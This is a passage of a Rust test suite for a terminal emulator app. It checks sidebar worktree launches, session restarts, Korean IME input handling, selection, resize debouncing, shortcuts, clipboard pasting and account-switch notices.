                reader: socket.try_clone().unwrap(),
                writer: pane::Writer::spawn(socket).unwrap(),
                instance: 1,
                launch: None,
                features: krill_proto::input::FEAT_INPUT,
                search: false,
            };
            assert!(matches!(
                s.settled(pane, Ok(Got::Live(session, Ok(linked))), cx),
                Next::Read(_)
            ));
            assert!(ready.exists());
            assert!(s.update_ready.is_none());
            drop(peer);
        });
    });
    std::fs::remove_dir_all(state).unwrap();
}

/// OWE-598(N4, PRD 시나리오 3 + N19): 사이드바 워크트리 행에서 Enter(또는 에이전트 단축키)가
/// 해당 워크트리 폴더(`cwd`)로 새 탭 세션을 띄우고, 사이드바 접기·창 비활성 시 사이드바 가시성이 꺼진다.
#[gpui::test]
fn shell_sidebar_worktree_launches_session_and_tracks_visibility(cx: &mut TestAppContext) {
    struct FixedTree;
    impl sidebar::Source for FixedTree {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(sidebar::Snapshot {
                sessions: vec![sidebar::Session {
                    id: krill_proto::SessionId(1),
                    status: krill_proto::control::AgentStatus::UNKNOWN,
                    worktree: Some(PathBuf::from("/repo/feat-wt")),
                    cwd: Some(PathBuf::from("/repo/feat-wt")),
                    account: None,
                }],
                trees: std::collections::BTreeMap::from([(
                    PathBuf::from("/repo"),
                    vec![PathBuf::from("/repo/feat-wt")],
                )]),
            })
        }
    }

    let (view, cx) = open(cx, state_path("worktree-launch"));
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.sidebar
                .update(cx, |sb, cx| sb.connect_source(Arc::new(FixedTree), cx));
        });
    });
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).tabs().len(), 1);

    // ⇧⌘0(`cmd-shift-0`)으로 사이드바에 포커스(세션 행) -> ↑로 워크트리 행(`/repo/feat-wt`) -> Enter로 새 터미널 탭 실행
    cx.simulate_keystrokes("cmd-shift-0 up enter");
    cx.run_until_parked();
    view.update(cx, |s, _| {
        assert_eq!(
            s.layout.tabs().len(),
            2,
            "Enter on worktree row must open a new tab"
        );
        let launch = s.launch_for(s.layout.active_tab().focused);
        assert_eq!(launch.cwd, b"/repo/feat-wt");
        assert_eq!(launch.program, Program::Login);
    });

    // 다시 ⇧⌘0으로 사이드바에 포커스(워크트리 행에 커서 유지) -> ⌥⌘1로 첫 에이전트(claude) 새 탭 실행
    cx.simulate_keystrokes("cmd-shift-0 alt-cmd-1");
    cx.run_until_parked();
    view.update(cx, |s, _| {
        assert_eq!(s.layout.tabs().len(), 3);
        let launch = s.launch_for(s.layout.active_tab().focused);
        assert_eq!(launch.cwd, b"/repo/feat-wt");
        assert_eq!(
            launch.program,
            Program::Agent {
                id: "claude".into()
            }
        );
    });

    // 사이드바 토글(⌘B) 시 사이드바 가시성이 꺼지고 다시 켜진다.
    cx.simulate_keystrokes("cmd-b");
    cx.run_until_parked();
    assert!(!cx.update(|_, cx| view.read(cx).sidebar.read(cx).is_visible()));
    cx.simulate_keystrokes("cmd-b");
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).sidebar.read(cx).is_visible()));

    // 창이 비활성화되면 사이드바·Git 패널 가시성이 꺼지고, 활성화되면 열린 상태로 복원된다.
    cx.update(|_, cx| view.update(cx, |s, cx| s.on_window_active_changed(false, cx)));
    cx.run_until_parked();
    assert!(!cx.update(|_, cx| view.read(cx).sidebar.read(cx).is_visible()));
    assert!(!cx.update(|_, cx| view.read(cx).diff.read(cx).is_visible()));

    cx.update(|_, cx| view.update(cx, |s, cx| s.on_window_active_changed(true, cx)));
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).sidebar.read(cx).is_visible()));
    assert!(cx.update(|_, cx| view.read(cx).diff.read(cx).is_visible()));
}

/// N10(OWE-596): 재개 시도는 성공하기 전까지 레이아웃의 옛 세션 연결을 지우지 않고,
/// 영구 실패면 무한 Retry 대신 콜드 화면과 오류를 남긴다.
#[gpui::test]
fn restart_keeps_session_until_resumed_and_stops_on_permanent_failure(cx: &mut TestAppContext) {
    use krill_proto::control::Cold;
    use krill_proto::screen::Op;

    let path = state_path("restart-n10");
    let (view, cx) = open(cx, path.clone());
    let pane = layout_of(&view, cx).active_tab().focused;
    let old = krill_proto::SessionId(42);
    let dir = path.parent().unwrap().to_path_buf();
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.paths = Some(Paths {
                socket: dir.join("run/krilld.sock"),
                holder: dir.join("missing-holder"),
                krilld: dir.join("missing-krilld"),
            });
            s.layout.set_session(pane, old);
            s.save();
            s.live.insert(pane, Live::new(Task::ready(())));
            s.cold(
                pane,
                old,
                Cold {
                    screen: vec![Op::Reset { cols: 10, lines: 2 }],
                    history: Vec::new(),
                },
                cx,
            );
            s.restart(pane, cx);
            // 재개 성공 전에는 레이아웃에 옛 세션이 그대로 남아 있어야 한다.
            assert_eq!(s.layout.session(pane), Some(old));
            // 영구 실패(예: 없는 에이전트 프로필·실행 파일 없음)는 무한 Retry하지 않고 콜드 화면과 오류를 보인다.
            let perm = std::io::Error::new(std::io::ErrorKind::NotFound, "unknown agent profile");
            let next = s.settled(pane, Err(perm), cx);
            assert!(matches!(next, Next::Gone));
            assert_eq!(s.layout.session(pane), Some(old));
            let l = &s.live[&pane];
            assert!(l.pane.is_cold());
            assert_eq!(l.error.as_deref(), Some("unknown agent profile"));
        });
    });
    cx.run_until_parked();
    assert!(cx.debug_bounds("session-ended").is_some());
    assert!(cx.debug_bounds("pane-error").is_some());
}

/// OWE-615 원인 1: 연속 음절 입력에서 `insertText` 직후 프레임이 와도 이전 확정 글자가 사라지지 않고
/// 새 preedit가 그 다음 칸에 그려진다. 에코(커서 전진)가 오면 낙관적 글자가 지워진다.
#[gpui::test]
fn ime_pending_survives_pre_echo_frame_and_shifts_preedit(cx: &mut TestAppContext) {
    use krill_proto::screen::{Cell, Cursor, Flags, Op, Revision, Seq, encode_update};

    let (view, cx) = open(cx, state_path("ime-pending"));
    let (ours, _theirs) = UnixStream::pair().unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    let frame = |s: &mut Shell, ops: Vec<Op>, cx: &mut Context<Shell>| {
        let f = &encode_update(Revision(1), Seq(0), ops).unwrap()[0];
        let (k, b) = ipc::read_frame(&mut &f[..]).unwrap().unwrap();
        assert!(s.on_frame(pane, k, &b, cx));
    };
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(3), ours, cx);
            frame(
                s,
                vec![
                    Op::Reset { cols: 20, lines: 2 },
                    Op::Cursor(Cursor {
                        line: 0,
                        column: 0,
                        visible: true,
                    }),
                ],
                cx,
            );
        });
    });
    cx.run_until_parked();
    // "한" 조합 중 다음 자모: insertText("한") → setMarkedText("ㄱ").
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            s.replace_and_mark_text_in_range(None, "하", None, window, cx);
        });
    });
    cx.simulate_input("한");
    // 에코 전 프레임(커서 그대로)이 와도 확정 대기가 남는다.
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            frame(
                s,
                vec![Op::Cursor(Cursor {
                    line: 0,
                    column: 0,
                    visible: true,
                })],
                cx,
            );
            s.replace_and_mark_text_in_range(None, "ㄱ", None, window, cx);
        });
    });
    cx.run_until_parked();
    cx.update(|_, cx| {
        let s = view.read(cx);
        let l = &s.live[&pane];
        assert_eq!(
            l.ime.pending().map(|p| (p.origin, p.text)),
            Some((krill_term::ime::CellPoint { line: 0, column: 0 }, "한"))
        );
        let o = l.ime.overlay().expect("새 preedit는 확정 글자 다음 칸");
        assert_eq!(o.origin.column, 2);
        assert_eq!(o.text, "ㄱ");
        assert_eq!(
            l.ime.candidate_anchor(0),
            krill_term::ime::CellPoint { line: 0, column: 2 }
        );
    });
    // 에코(커서가 2열로 전진, 화면에 "한" 표시)가 오면 낙관적 글자가 지워진다.
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            frame(
                s,
                vec![
                    Op::Line {
                        line: 0,
                        cells: vec![
                            Cell {
                                ch: '한',
                                flags: Flags::WIDE,
                                ..Cell::default()
                            },
                            Cell {
                                flags: Flags::SPACER,
                                ..Cell::default()
                            },
                        ],
                    },
                    Op::Cursor(Cursor {
                        line: 0,
                        column: 2,
                        visible: true,
                    }),
                ],
                cx,
            );
        });
    });
    cx.run_until_parked();
    cx.update(|_, cx| {
        let s = view.read(cx);
        let l = &s.live[&pane];
        assert_eq!(l.ime.pending(), None, "에코 도착 후 낙관적 글자 삭제");
        let o = l.ime.overlay().expect("preedit는 에코와 무관하게 유지");
        assert_eq!(o.origin.column, 2);
    });
}

/// OWE-615 원인 4: 조합 중 일반 문자 키의 `KeyUp`은 영문 Release 시퀀스가 되므로 보내지 않는다.
#[gpui::test]
fn ime_composing_key_up_sends_no_release(cx: &mut TestAppContext) {
    use std::io::Read as _;

    use krill_proto::screen::Msg as _;
    use krill_proto::term_modes::{Modes, TERM_MODES};

    let (view, cx) = open(cx, state_path("ime-keyup"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(3), ours, cx);
            // report_events + report_all: 문자 키 Release도 시퀀스가 나가는 모드.
            let modes = Modes {
                kitty: 11,
                flags: 0,
            };
            let body = postcard::to_stdvec(&modes).unwrap();
            assert!(s.on_frame(pane, TERM_MODES, &body, cx));
            s.live.get_mut(&pane).unwrap().ime.set_marked("ㅎ", None);
        });
    });
    cx.run_until_parked();
    // 조합 중 "a" 키 Release: report_all 모드에서도 PTY에 가지 않는다.
    cx.simulate_event(gpui::KeyUpEvent {
        keystroke: gpui::Keystroke::parse("a").unwrap(),
    });
    cx.run_until_parked();
    theirs.set_nonblocking(true).unwrap();
    assert!(
        theirs.read(&mut [0; 64]).is_err(),
        "조합 중 문자 키 Release는 전송 없음"
    );
    cx.update(|_, cx| {
        let s = view.read(cx);
        assert!(s.live[&pane].ime.is_composing(), "조합 유지");
    });
    // 조합이 끝나면 같은 Release는 정상 전송된다.
    cx.simulate_input("ㅎ");
    cx.simulate_event(gpui::KeyUpEvent {
        keystroke: gpui::Keystroke::parse("a").unwrap(),
    });
    cx.run_until_parked();
    theirs.set_nonblocking(false).unwrap();
    theirs
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let mut next = || {
        let (k, b) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
        krill_proto::input::Input::decode(k, &b).unwrap().bytes
    };
    // 먼저 IME 확정("ㅎ"의 report-all 형식)이 가고, 그 다음 문자 키 Release가 간다.
    assert_eq!(next(), b"\x1b[12622;1u");
    assert_eq!(next(), b"\x1b[97;1:3u");
}

/// AS-02: 포커스 칸 변경(`change`·`open_session`, `window: None`) 때도 IME 조합을 확정해
/// PTY에 보내고 조합 상태를 비운다. 플랫폼 `discardMarkedText`는 테스트 창이 `AppKit`이
/// 아니라 관측할 수 없어, 확정 바이트·상태로 계약을 고정한다.
#[gpui::test]
fn focus_change_commits_ime_without_window(cx: &mut TestAppContext) {
    use krill_proto::screen::Msg as _;
    use std::os::unix::net::UnixStream;
    let (view, cx) = open(cx, state_path("ime-commit-none"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(7), ours, cx);
            s.live.get_mut(&pane).unwrap().ime.set_marked("가", None);
            // `change()`·`open_session()`과 같은 호출 모양(`window: None`).
            s.commit_ime(pane, None, cx);
        });
    });
    cx.run_until_parked();
    let (k, b) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
    assert_eq!(
        krill_proto::input::Input::decode(k, &b).unwrap().bytes,
        "가".as_bytes()
    );
    cx.update(|_, cx| {
        let s = view.read(cx);
        assert!(!s.live[&pane].ime.is_composing(), "조합 비움");
        assert_eq!(s.ime_discards.get(), 1, "플랫폼 조합도 폐기해야 한다");
    });
}

/// AS-12: 포커스가 셸 밖에 있으면(검색 바 입력 중) keyup이 PTY로 새지 않는다.
#[gpui::test]
fn key_up_without_shell_focus_sends_nothing(cx: &mut TestAppContext) {
    use std::io::Read as _;
    use std::os::unix::net::UnixStream;
    let (view, cx) = open(cx, state_path("keyup-unfocused"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            use krill_proto::term_modes::{Modes, TERM_MODES};
            s.attach_test(pane, krill_proto::SessionId(11), ours, cx);
            // kitty 이벤트 보고 모드: 문자 키 Release도 시퀀스가 나가는 모드.
            let modes = Modes {
                kitty: 11,
                flags: 0,
            };
            let body = postcard::to_stdvec(&modes).unwrap();
            assert!(s.on_frame(pane, TERM_MODES, &body, cx));
        });
    });
    // 검색 바를 열어 포커스를 셸 밖으로 옮긴다.
    cx.update(|window, cx| {
        view.update(cx, |s, cx| s.toggle_search(window, cx));
    });
    cx.run_until_parked();
    cx.simulate_event(gpui::KeyUpEvent {
        keystroke: gpui::Keystroke::parse("enter").unwrap(),
    });
    cx.run_until_parked();
    theirs.set_nonblocking(true).unwrap();
    assert!(
        theirs.read(&mut [0; 64]).is_err(),
        "포커스 없는 keyup은 PTY로 보내지 않는다"
    );
}

/// AS-17: 출력으로 선택 자리 글자가 바뀌면 선택을 지우고, 그대로면 유지한다.
#[gpui::test]
fn stale_selection_clears_on_new_output(cx: &mut TestAppContext) {
    use krill_proto::screen::{Cell, Op, Revision, Seq, encode_update};
    use std::os::unix::net::UnixStream;
    let (view, cx) = open(cx, state_path("selection-stale"));
    let (ours, _theirs) = UnixStream::pair().unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    let row = |t: &str| {
        t.chars()
            .map(|ch| Cell {
                ch,
                ..Cell::default()
            })
            .collect::<Vec<_>>()
    };
    let frame = |ops: Vec<Op>| encode_update(Revision(1), Seq(0), ops).unwrap()[0].clone();
    let select_all_first_line = |s: &mut Shell, cx: &mut gpui::Context<Shell>| {
        let l = s.live.get_mut(&pane).unwrap();
        l.selection = Some(Selection {
            anchor: select::Point { line: 0, column: 0 },
            head: select::Point { line: 0, column: 4 },
        });
        l.selecting = true;
        assert!(s.select_end(pane, cx));
    };
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(13), ours, cx);
            let reset = frame(vec![
                Op::Reset { cols: 20, lines: 2 },
                Op::Line {
                    line: 0,
                    cells: row("hello"),
                },
            ]);
            let (k, b) = krill_proto::ipc::read_frame(&mut &reset[..])
                .unwrap()
                .unwrap();
            assert!(s.on_frame(pane, k, &b, cx));
            select_all_first_line(s, cx);
            assert_eq!(
                s.live[&pane].selection_text.as_deref(),
                Some("hello"),
                "드래그 끝 스냅샷"
            );
        });
    });
    // 같은 글자 다시 그리면 유지.
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let same = frame(vec![Op::Line {
                line: 0,
                cells: row("hello"),
            }]);
            let (k, b) = krill_proto::ipc::read_frame(&mut &same[..])
                .unwrap()
                .unwrap();
            assert!(s.on_frame(pane, k, &b, cx));
            assert!(s.live[&pane].selection.is_some(), "같은 글자는 유지");
        });
    });
    // 출력이 바뀌면(스크롤·리사이즈·재접속) 지운다.
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            let changed = frame(vec![Op::Line {
                line: 0,
                cells: row("world"),
            }]);
            let (k, b) = krill_proto::ipc::read_frame(&mut &changed[..])
                .unwrap()
                .unwrap();
            assert!(s.on_frame(pane, k, &b, cx));
            assert!(s.live[&pane].selection.is_none(), "바뀐 글자는 지움");
            assert!(s.live[&pane].selection_text.is_none());
        });
    });
}

/// OWE-615 원인 4: 일반 문자 키 판정(Ctrl·Alt·Cmd·Fn 없음, 한 글자).
#[test]
fn plain_char_key_gate_for_key_up() {
    let plain = |k: &str| is_plain_char_key(&gpui::Keystroke::parse(k).unwrap());
    assert!(plain("a"));
    assert!(plain("space"));
    assert!(!plain("ctrl-c"));
    assert!(!plain("cmd-c"));
    assert!(!plain("enter"));
    assert!(!plain("left"));
}

#[gpui::test]
fn history_resume_opens_new_tab_without_replacing_existing_session(cx: &mut TestAppContext) {
    let path = state_path("agent-history");
    let (view, cx) = open(cx, path);
    let original = layout_of(&view, cx).active_tab().focused;
    view.update(cx, |shell, _| {
        shell
            .layout
            .set_session(original, krill_proto::SessionId(4));
    });
    let panel = view.read_with(cx, |shell, _| shell.history.clone());
    panel.update(cx, |_, cx| {
        cx.emit(krill_app::agent_history::Open(krill_proto::SessionId(99)));
    });
    cx.run_until_parked();
    let layout = layout_of(&view, cx);
    assert_eq!(layout.tabs().len(), 2);
    assert_eq!(layout.session(original), Some(krill_proto::SessionId(4)));
    assert_eq!(
        layout.session(layout.active_tab().focused),
        Some(krill_proto::SessionId(99))
    );
}

/// OWE-586: 보낸 입력의 ack 없이 PROBE이 지나면 멈춘 칸 배너가 보이고, ack가 오면 사라진다.
#[gpui::test]
fn stalled_pane_shows_banner_until_ack(cx: &mut TestAppContext) {
    use std::os::unix::net::UnixStream;

    use krill_proto::input::{Input, InputAck, InputResult, PROBE, kind};
    use krill_proto::screen::Msg as _;

    let (view, cx) = open(cx, state_path("stalled"));
    let pane = layout_of(&view, cx).active_tab().focused;
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(std::time::Duration::from_secs(5)))
        .unwrap();
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(3), ours, cx);
        });
    });
    cx.run_until_parked();
    assert_eq!(cx.update(|_, cx| view.read(cx).stalled_banner()), None);
    cx.simulate_keystrokes("enter");
    cx.run_until_parked();
    // ack 없이 PROBE이 지나면 멈춤 배너가 보인다(데몬 SIGSTOP 상황).
    std::thread::sleep(PROBE + std::time::Duration::from_millis(200));
    assert!(cx.update(|_, cx| view.read(cx).stalled_banner()).is_some());
    // ack가 오면 배너가 사라진다(SIGCONT 뒤 복구).
    let (k, body) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
    let id = Input::decode(k, &body).unwrap().id;
    let ack = InputAck {
        id,
        result: InputResult::Applied,
    };
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            assert!(s.on_frame(pane, kind::INPUT_ACK, &ack.encode().unwrap(), cx));
            assert_eq!(s.stalled_banner(), None);
        });
    });
}

#[gpui::test]
fn unchanged_focus_does_not_save_and_focus_changes_are_coalesced(cx: &mut TestAppContext) {
    let path = state_path("focus-save");
    let (view, cx) = open(cx, path.clone());
    view.update(cx, |s, cx| {
        let pane = s.layout.active_tab().focused;
        for _ in 0..10 {
            s.change(true, cx, |layout| layout.focus(pane));
        }
        s.saver.flush();
        assert!(
            !path.exists(),
            "unchanged focus must not create a layout file"
        );
        s.change(true, cx, |layout| layout.split(Axis::Horizontal));
        let other = s.layout.active_tab().focused;
        s.change(true, cx, |layout| layout.focus(pane));
        s.change(true, cx, |layout| layout.focus(other));
        s.saver.flush();
        assert_eq!(Layout::load(&path).unwrap(), s.layout);
    });
}

#[gpui::test]
fn resize_burst_waits_for_quiet_and_sends_only_final_grid(cx: &mut TestAppContext) {
    cx.update(gpui_component::init);
    let view = cx.new(|cx| Shell::new(None, cx));
    let pane = view.read_with(cx, |s, _| s.layout.active_tab().focused);
    view.update(cx, |s, _| {
        s.live.insert(pane, Live::new(Task::ready(())));
    });
    for cols in 80..90 {
        view.update(cx, |s, cx| s.schedule_fit(pane, (cols, 24), cx));
        cx.run_until_parked();
        cx.executor().advance_clock(Duration::from_millis(5));
        assert_eq!(view.read_with(cx, |s, _| s.live[&pane].pane.grid()), None);
    }
    cx.executor().advance_clock(Duration::from_millis(75));
    cx.run_until_parked();
    assert_eq!(
        view.read_with(cx, |s, _| s.live[&pane].pane.grid()),
        Some((89, 24))
    );
}

#[gpui::test]
fn daemon_watch_disconnect_releases_assertion_when_sidebar_polling_is_stopped(
    cx: &mut TestAppContext,
) {
    cx.update(gpui_component::init);
    let view = cx.new(|cx| Shell::new(None, cx));
    view.update(cx, |s, cx| {
        s.sidebar
            .update(cx, |sidebar, cx| sidebar.set_active(false, cx));
        krill_app::alert::sync_snapshot(
            &sidebar::Snapshot {
                sessions: vec![sidebar::Session {
                    id: krill_proto::SessionId(609),
                    status: krill_proto::control::AgentStatus {
                        state: krill_proto::control::AgentState::Working,
                        ..krill_proto::control::AgentStatus::UNKNOWN
                    },
                    worktree: None,
                    cwd: None,
                    account: None,
                }],
                trees: std::collections::BTreeMap::new(),
            },
            cx,
        );
        assert!(krill_app::alert::is_preventing_sleep(cx));
        s.set_link(Link::Down, cx);
        assert!(!krill_app::alert::is_preventing_sleep(cx));
    });
}

#[gpui::test]
fn orca_parity_shortcuts_pane_cycle_zoom_clear_select_all_and_tab_numbers(cx: &mut TestAppContext) {
    let path = state_path("orca-shortcuts");
    let (view, cx) = open(cx, path);

    // Split right & down -> 3 panes in tab 0, test cmd-] and cmd-[ pane focus cycling and cmd-shift-enter zoom.
    cx.simulate_keystrokes("cmd-d cmd-shift-d");
    let l = layout_of(&view, cx);
    let visible = l.visible();
    assert_eq!(visible.len(), 3);
    assert_eq!(l.active_tab().focused, visible[2]);

    cx.simulate_keystrokes("cmd-]");
    assert_eq!(layout_of(&view, cx).active_tab().focused, visible[0]);

    cx.simulate_keystrokes("cmd-[");
    assert_eq!(layout_of(&view, cx).active_tab().focused, visible[2]);

    // Zoom focused pane (cmd-shift-enter) and unzoom.
    cx.simulate_keystrokes("cmd-shift-enter");
    assert_eq!(
        cx.update(|_, cx| view.read(cx).zoomed_pane),
        Some(visible[2])
    );
    cx.simulate_keystrokes("cmd-shift-enter");
    assert_eq!(cx.update(|_, cx| view.read(cx).zoomed_pane), None);

    // Toggle right diff panel via cmd-l and cmd-shift-g (Orca parity).
    let before_panel = cx.update(|_, cx| view.read(cx).panel_collapsed);
    cx.simulate_keystrokes("cmd-l");
    assert_eq!(
        cx.update(|_, cx| view.read(cx).panel_collapsed),
        !before_panel
    );
    cx.simulate_keystrokes("cmd-shift-g");
    assert_eq!(
        cx.update(|_, cx| view.read(cx).panel_collapsed),
        before_panel
    );

    // Create 3 tabs and verify ctrl-2, ctrl-tab, ctrl-shift-tab, ctrl-pagedown, ctrl-pageup switch tabs.
    cx.simulate_keystrokes("cmd-t cmd-t");
    assert_eq!(layout_of(&view, cx).tabs().len(), 3);
    cx.simulate_keystrokes("cmd-1");
    assert_eq!(layout_of(&view, cx).active(), 0);
    cx.simulate_keystrokes("ctrl-2");
    assert_eq!(layout_of(&view, cx).active(), 1);
    cx.simulate_keystrokes("ctrl-tab");
    assert_eq!(layout_of(&view, cx).active(), 0);
    cx.simulate_keystrokes("ctrl-shift-tab");
    assert_eq!(layout_of(&view, cx).active(), 1);
    cx.simulate_keystrokes("ctrl-pageup");
    assert_eq!(layout_of(&view, cx).active(), 0);
    cx.simulate_keystrokes("ctrl-pagedown");
    assert_eq!(layout_of(&view, cx).active(), 1);
    cx.simulate_keystrokes("cmd-1");
    assert_eq!(layout_of(&view, cx).active(), 0);

    // Attach live session on tab 0 in kitty report-events mode (kitty = 7).
    // Pressing ctrl-1 (staying on tab 0 so pane0 stays live) must not leak key-down or key-up bytes,
    // followed by SelectAll (cmd-a) and ClearPane (cmd-k) sending only 0x0c.
    let (ours0, mut theirs0) = UnixStream::pair().unwrap();
    theirs0
        .set_read_timeout(Some(std::time::Duration::from_secs(2)))
        .unwrap();
    let pane0 = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            use krill_proto::screen::{Op, Revision, Seq, encode_update};
            use krill_proto::term_modes::{Modes, TERM_MODES};

            s.layout.set_session(pane0, krill_proto::SessionId(70));
            s.attach_test(pane0, krill_proto::SessionId(70), ours0, cx);
            let modes = Modes { kitty: 7, flags: 0 };
            let body = postcard::to_stdvec(&modes).unwrap();
            assert!(s.on_frame(pane0, TERM_MODES, &body, cx));
            let frame = &encode_update(Revision(1), Seq(0), vec![Op::Reset { cols: 20, lines: 4 }])
                .unwrap()[0];
            let (k, body) = ipc::read_frame(&mut &frame[..]).unwrap().unwrap();
            assert!(s.on_frame(pane0, k, &body, cx));
        });
    });

    cx.simulate_keystrokes("ctrl-1");
    assert_eq!(layout_of(&view, cx).active(), 0);

    // SelectAll (cmd-a) and ClearPane (cmd-k) on live pane0.
    cx.simulate_keystrokes("cmd-a");
    assert!(cx.update(|_, cx| view.read(cx).live.get(&pane0).unwrap().selection.is_some()));
    cx.simulate_keystrokes("cmd-k");
    {
        use krill_proto::screen::Msg as _;
        let (k, b) = krill_proto::ipc::read_frame(&mut theirs0).unwrap().unwrap();
        assert_eq!(
            krill_proto::input::Input::decode(k, &b).unwrap().bytes,
            b"\x0c"
        );
    }

    // Jump to tab 2 via cmd-9, attach a session, close tab 2 (cmd-shift-w), and reopen via cmd-shift-t.
    cx.simulate_keystrokes("cmd-9");
    assert_eq!(layout_of(&view, cx).active(), 2);
    let (ours, _theirs) = UnixStream::pair().unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.layout.set_session(pane, krill_proto::SessionId(77));
            s.attach_test(pane, krill_proto::SessionId(77), ours, cx);
        });
    });
    cx.simulate_keystrokes("cmd-shift-w");
    assert_eq!(layout_of(&view, cx).tabs().len(), 2);
    cx.simulate_keystrokes("cmd-shift-t");
    let reopened = layout_of(&view, cx);
    assert_eq!(reopened.tabs().len(), 3);
    assert_eq!(
        reopened.session(reopened.active_tab().focused),
        Some(krill_proto::SessionId(77))
    );
}

#[gpui::test]
fn clipboard_image_and_external_paths_paste_into_focused_pane(cx: &mut TestAppContext) {
    use gpui::{ClipboardEntry, ClipboardString, Image, ImageFormat};
    use krill_proto::input::Input;
    use krill_proto::screen::Msg as _;

    let (view, cx) = open(cx, state_path("clipboard-image"));
    let (ours, mut theirs) = UnixStream::pair().unwrap();
    theirs
        .set_read_timeout(Some(std::time::Duration::from_secs(2)))
        .unwrap();
    let pane = layout_of(&view, cx).active_tab().focused;
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.attach_test(pane, krill_proto::SessionId(42), ours, cx);
        });
    });
    cx.run_until_parked();

    // 1. Clipboard image paste: saves to $TMPDIR/minikrill-paste/clipboard-<id>.png (0600) and sends path.
    let png_bytes = vec![0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a];
    let img = Image::from_bytes(ImageFormat::Png, png_bytes.clone());
    let expected_path = security::save_clipboard_image(&img).unwrap();
    assert_eq!(std::fs::read(&expected_path).unwrap(), png_bytes);
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        let mode = std::fs::metadata(&expected_path)
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o600);
    }

    let item = ClipboardItem::new_image(&img);
    cx.update(|window, cx| {
        view.update(cx, |s, cx| s.paste_clipboard_item(&item, window, cx));
    });
    let (k, b) = krill_proto::ipc::read_frame(&mut theirs).unwrap().unwrap();
    let pasted = String::from_utf8(Input::decode(k, &b).unwrap().bytes).unwrap();
    assert!(
        pasted.contains("minikrill-paste/clipboard-")
            && std::path::Path::new(pasted.trim_end())
                .extension()
                .is_some_and(|ext| ext.eq_ignore_ascii_case("png")),
        "unexpected pasted path: {pasted}"
    );

    // 2. ExternalPaths clipboard paste: shell-escapes spaces in copied file paths even when String entry is also present.
    let ext_item = ClipboardItem {
        entries: vec![
            ClipboardEntry::String(ClipboardString::new("/tmp/my screenshot 1.png".into())),
            ClipboardEntry::ExternalPaths(ExternalPaths(
                [PathBuf::from("/tmp/my screenshot 1.png")]
                    .into_iter()
                    .collect(),
            )),
        ],
    };
    let payload = security::clipboard_paste_payload(&ext_item).unwrap();
    assert_eq!(payload, b"'/tmp/my screenshot 1.png' ");
}

#[gpui::test]
fn account_switch_and_auto_switch_banner_notification(cx: &mut TestAppContext) {
    use krill_proto::input::Input;
    use krill_proto::screen::Msg as _;
    use krill_proto::usage::{AccountsSnapshot, AutoSwitchEvent, AutoSwitchPolicy, ProviderKind};

    let layout_path = state_path("account-switch");
    let state_dir = layout_path.parent().unwrap().to_path_buf();
    let (view, cx) = open(cx, layout_path);
    cx.update(|_, cx| {
        krill_app::settings::init_at(Some(state_dir.clone()), cx);
        view.update(cx, |s, cx| {
            s.apply_accounts_snapshot(
                AccountsSnapshot {
                    accounts: Vec::new(),
                    auto_switch: AutoSwitchPolicy::default(),
                    switched: vec![AutoSwitchEvent {
                        provider: ProviderKind::Claude,
                        from_id: "claude-host".into(),
                        from_label: "Host (.claude)".into(),
                        to_id: "claude-backup".into(),
                        to_label: "Backup Max".into(),
                        reason_percent: 95,
                    }],
                    statuses: Vec::new(),
                    advanced: krill_proto::usage::AccountPolicyState::default(),
                    connections: Box::default(),
                },
                cx,
            );
        });
    });
    let notice = cx.update(|_, cx| view.read(cx).notice.clone()).unwrap();
    assert!(notice.contains("Host (.claude)"));
    assert!(notice.contains("Backup Max"));
    assert!(notice.contains("95%"));

    // Verify state_dir resolution when paths.socket is under `<state_dir>/run/krilld.sock`
    // and live sync of SSH hosts + connect_ssh_host from Config.
    let host = krill_app::ssh_hosts::add_host(
        Some(&state_dir),
        "studio-node",
        "owen@10.0.0.42",
        Some(2222),
        None,
    )
    .unwrap()
    .into_iter()
    .next()
    .unwrap();
